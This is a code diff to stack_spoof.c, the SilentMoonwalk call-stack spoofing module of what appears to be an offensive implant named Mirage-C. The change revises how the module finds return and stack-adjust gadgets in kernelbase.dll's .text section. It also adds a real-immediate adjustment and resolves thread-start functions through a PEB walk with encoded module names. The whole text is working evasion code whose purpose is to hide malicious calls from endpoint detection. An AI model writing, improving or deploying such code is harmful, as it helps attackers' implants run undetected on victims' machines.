@@ -1,13 +1,15 @@
 /*
  * stack_spoof.c — SilentMoonwalk stack spoofing for Mirage-C
- *
  * PEB-walk only, CRT-free. Scans kernelbase.dll .text section
- * for JMP[RBX] (FF 23) and ADD_RSP (48 83 C4 xx) gadgets,
- * resolves RtlUserThreadStart + BaseThreadInitThunk.
+ * for a return hop gadget (default 48 8B 00 C3; FF 23 when
+ * SPOOF_JMP_RBX is defined) and ADD_RSP (48 83 C4 xx C3),
+ * records the real ADD_RSP imm8 in cfg->rsp_adjust, and resolves
+ * RtlUserThreadStart + BaseThreadInitThunk.
  *
  * Reference: SilentMoonwalk technique
  *   https://github.com/klezVirus/SilentMoonwalk
  */
+
 #include "stack_spoof.h"
 #ifdef _WIN32
 #include <windows.h>
@@ -64,8 +66,20 @@ static int get_text_bounds(void *base, uintptr_t *start, uintptr_t *end) {
 /* ── Gadget scanning ─────────────────────────────────────── */
 
 
-/* Find JMP[RBX]: FF 23 anywhere in .text */
+/* ── Gadget scanning ─────────────────────────────────────── */
+
+/*
+ * find_jmp_rbx — locate the return-address-reload gadget.
+ *
+ * Primary:  48 8B 00 C3  (mov rax,[rax]; ret) — pure ret-based hop
+ * that keeps non-volatile registers intact (the asm stub no longer
+ * corrupts RBX).
+ * Fallback: FF 23 (jmp [rbx]) — the classic SilentMoonwalk gadget;
+ * only compiled in when SPOOF_JMP_RBX is defined because it relies
+ * on the asm stub leaving RBX pointed at fake[1] and it corrupts RBX.
+ */
 static int find_jmp_rbx(const uint8_t *text, uintptr_t len, uintptr_t *out) {
+#ifdef SPOOF_JMP_RBX
     for (uintptr_t i = 0; i + 1 < len; i++) {
         if (text[i] == 0xFF && text[i + 1] == 0x23) {
             *out = i;
@@ -73,26 +87,38 @@ static int find_jmp_rbx(const uint8_t *text, uintptr_t len, uintptr_t *out) {
         }
     }
     return 0;
+#else
+    for (uintptr_t i = 0; i + 3 < len; i++) {
+        if (text[i] == 0x48 && text[i + 1] == 0x8B &&
+            text[i + 2] == 0x00 && text[i + 3] == 0xC3) {
+            *out = i;
+            return 1;
+        }
+    }
+    return 0;
+#endif
 }
 
-/* Find ADD_RSP,imm8;ret: 48 83 C4 xx C3.
-   We need imm8=0x08 for the standard frame layout.
-   Fallback to any imm8. */
-static int find_add_rsp(const uint8_t *text, uintptr_t len, uintptr_t *out) {
-    /* Prefer 48 83 C4 08 C3 */
+/* Find ADD_RSP,imm8;ret: 48 83 C4 xx C3. Records the actual imm8 in
+ * *adjust so the C-side chain math uses the real gadget behavior. */
+static int find_add_rsp(const uint8_t *text, uintptr_t len,
+                        uintptr_t *out, uint8_t *adjust) {
+    /* Prefer 48 83 C4 08 C3 (imm8 = 8) */
     for (uintptr_t i = 0; i + 4 < len; i++) {
         if (text[i] == 0x48 && text[i + 1] == 0x83 &&
             text[i + 2] == 0xC4 && text[i + 3] == 0x08 &&
             text[i + 4] == 0xC3) {
             *out = i;
+            *adjust = 0x08;
             return 1;
         }
     }
-    /* Fallback: any 48 83 C4 xx C3 */
+    /* Fallback: any 48 83 C4 xx C3 — record its real imm8 */
     for (uintptr_t i = 0; i + 4 < len; i++) {
         if (text[i] == 0x48 && text[i + 1] == 0x83 &&
             text[i + 2] == 0xC4 && text[i + 4] == 0xC3) {
             *out = i;
+            *adjust = text[i + 3];
             return 1;
         }
     }
@@ -112,11 +138,13 @@ int spoof_init(void) {
     const uint8_t *s = (const uint8_t *)text_start;
 
     uintptr_t off;
+    uint8_t  rsp_adjust = 0;
     if (!find_jmp_rbx(s, text_len, &off)) return 0;
     g_spoof_cfg.jmp_rbx_gadget = text_start + off;
 
-    if (!find_add_rsp(s, text_len, &off)) return 0;
+    if (!find_add_rsp(s, text_len, &off, &rsp_adjust)) return 0;
     g_spoof_cfg.add_rsp_gadget = text_start + off;
+    g_spoof_cfg.rsp_adjust     = rsp_adjust;
 
     void *ntdll = get_module_base(enc_ntdll, ENC_NTDLL_LEN);
     if (!ntdll) return 0;
